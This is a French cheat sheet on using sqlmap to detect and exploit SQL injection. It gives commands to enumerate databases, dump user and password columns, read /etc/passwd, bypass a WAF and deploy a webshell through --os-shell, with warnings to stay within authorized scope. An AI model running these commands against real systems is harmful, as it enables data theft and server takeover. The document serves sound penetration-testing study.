---
title: "sqlmap : automatiser l'injection SQL"
tags: [securite, web, terminal]
created: 2026-09-19
updated: 2026-09-19
status: stable
---

## En bref

Détecter et **exploiter** une injection SQL sans écrire les payloads à la main :
sqlmap teste un paramètre, confirme la faille, puis énumère la base et en extrait
le contenu. Le cycle : **pointer une requête → le laisser détecter → énumérer
bases/tables/colonnes → extraire (*dump*).**

Il vient *après* qu'un paramètre a été repéré comme suspect — à la main, ou
récupéré depuis un proxy comme Burp. Pour comprendre la faille elle-même, c'est
[Les attaques web courantes](attaques-web.md).

## Donner la requête à tester

```sh
sqlmap -u "http://10.10.10.5/page.php?id=1" --batch   # cible GET, --batch = reponses par defaut
sqlmap -u "http://10.10.10.5/login.php" --data="user=johndoe&pass=x"   # cible POST
sqlmap -r requete.txt                                 # requete brute exportee depuis Burp (le plus fiable)
sqlmap -u "http://10.10.10.5/page.php?id=1" -p id     # ne tester QUE le parametre id
sqlmap -u "..." --cookie="PHPSESSID=abcdef123456"     # tester derriere une session authentifiee
```

`-r requete.txt` est la voie la plus sûre : la requête contient déjà les
en-têtes, le cookie et le corps exacts. On l'obtient dans Burp par *clic droit →
Copy to file* sur la requête interceptée.

## Énumérer, puis extraire

```sh
sqlmap -u "..." --dbs                        # lister les bases
sqlmap -u "..." -D boutique --tables         # les tables d'une base
sqlmap -u "..." -D boutique -T users --columns   # les colonnes d'une table
sqlmap -u "..." -D boutique -T users -C nom,motdepasse --dump   # extraire ces colonnes
sqlmap -u "..." -D boutique -T users --dump  # extraire toute la table
sqlmap -u "..." --current-user --current-db --is-dba   # qui suis-je, quels droits
```

`--is-dba` qui répond `True` change tout : compte administrateur de la base,
donc souvent lecture de fichiers et parfois exécution de commandes (voir plus
bas).

## Les options qui reviennent

| Option | Sens |
| --- | --- |
| `--batch` | ne pose aucune question, prend les réponses par défaut |
| `--level=5` | teste plus d'emplacements (en-têtes, cookie) — 1 à 5 |
| `--risk=3` | autorise des tests plus lourds (dont `UPDATE`) — 1 à 3 |
| `--technique=BEUST` | limiter les techniques (Blind, Error, Union, Stacked, Time) |
| `--threads=10` | paralléliser l'extraction |
| `--tamper=space2comment` | contourner un WAF en transformant les payloads |

Monter `--level` et `--risk` quand une injection *soupçonnée* n'est pas détectée
par défaut : le défaut (`1`/`1`) ne teste que le corps et l'URL, pas les cookies
ni les en-têtes.

## Au-delà de l'extraction

Quand les droits le permettent, sqlmap dépasse la lecture de données :

```sh
sqlmap -u "..." --file-read=/etc/passwd       # lire un fichier du serveur
sqlmap -u "..." --sql-shell                    # un prompt SQL interactif
sqlmap -u "..." --os-shell                     # tenter un shell systeme (depose une webshell)
```

`--os-shell` est le pont vers l'exploitation : s'il aboutit, on a une exécution
de commandes sur le serveur, à faire évoluer ensuite en vrai shell.

## Pièges

- **sqlmap n'est pas discret et il écrit.** Avec `--risk=3` il peut lancer des
  `UPDATE`/`DELETE` de test ; `--os-shell` dépose un fichier sur la cible. Jamais
  sur de la production sans autorisation écrite.
- **Il ne vaut que par le contexte de la requête.** Une injection derrière une
  authentification ou un jeton anti-CSRF ne sera pas trouvée depuis une simple
  URL : passer par `-r` avec la requête complète, cookie compris.
- **`--batch` prend des raccourcis.** Il répond « défaut » à tout, y compris
  « faut-il continuer avec cette technique ? ». Pratique, mais relire ce qu'il a
  décidé quand un résultat surprend.
- **Faux négatif ≠ pas de faille.** S'il ne trouve rien au niveau 1, remonter
  `--level`/`--risk` et cibler le paramètre avec `-p` avant de conclure.
- **La détection peut être lente en aveugle temporel** (*time-based blind*) :
  chaque bit extrait coûte une requête temporisée. Cibler les colonnes utiles
  avec `-C` plutôt que `--dump` sur toute la table.
- **Cadre légal, comme tout le reste.** Exploiter une injection extrait des
  données réelles ; on ne le pointe que sur un labo ou un périmètre autorisé.

## Voir aussi

- [Les attaques web courantes](attaques-web.md)
- [Méthodologie : de la reconnaissance au shell (web)](methodologie-pentest-web.md)
- [Burp Suite Community : le proxy d'interception web](burp-suite.md)
- [Nikto : scanner de serveur web](nikto.md)
- [Metasploit : le framework d'exploitation](metasploit.md)
- [Lexique de l'évaluation de sécurité](lexique.md)
- <https://github.com/sqlmapproject/sqlmap/wiki/Usage>
